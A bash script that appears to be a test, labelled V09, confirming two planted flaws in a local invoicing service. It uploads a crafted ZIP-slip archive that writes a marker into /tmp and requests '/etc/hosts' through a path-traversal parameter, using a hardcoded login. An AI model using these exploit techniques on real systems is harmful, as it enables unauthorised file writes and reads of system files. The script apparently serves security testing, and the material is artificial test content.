#!/usr/bin/env bash
set -euo pipefail

CORE=${CORE:-http://localhost:8000}
TOKEN=$(curl -fsS "$CORE/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"operator@acme.example","password":"Password123!"}' | jq -r '.access_token')
invoices=$(curl -fsS "$CORE/invoices" -H "Authorization: Bearer $TOKEN")
invoice=$(jq -c '.[0]' <<<"$invoices")
invoice_id=$(jq -r '.id' <<<"$invoice")
archive=$(mktemp --suffix=.zip)
trap 'rm -f "$archive"' EXIT
python3 - "$archive" <<'PY'
import sys
from zipfile import ZipFile

with ZipFile(sys.argv[1], "w") as archive:
    archive.writestr("../../../../tmp/helios-zipslip-poc", "zip-slip marker")
PY
curl -fsS "$CORE/invoices/$invoice_id/statements" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@$archive" >/dev/null

if docker compose exec -T core-api test -f /tmp/helios-zipslip-poc; then
  echo "PASS V09: ZIP entry escaped the invoice directory into /tmp"
else
  echo "FAIL V09: ZIP-slip marker was not found"
  exit 1
fi

document_id=""
for candidate_id in $(jq -r '.[].id' <<<"$invoices"); do
  documents=$(curl -fsS "$CORE/invoices/$candidate_id/documents" -H "Authorization: Bearer $TOKEN")
  document_id=$(jq -r '.[0].id // empty' <<<"$documents")
  if [[ -n "$document_id" ]]; then
    break
  fi
done
if [[ -n "$document_id" ]]; then
  status=$(curl -sS -o /dev/null -w '%{http_code}' \
    "$CORE/documents/$document_id/download?p=/etc/hosts" \
    -H "Authorization: Bearer $TOKEN")
  if [[ "$status" == "200" ]]; then
    echo "PASS V09: document path join accepted an absolute traversal target (/etc/hosts)"
  else
    echo "FAIL V09: document traversal request returned HTTP $status"
    exit 1
  fi
else
  echo "INFO V09: no seeded document available for traversal request"
fi
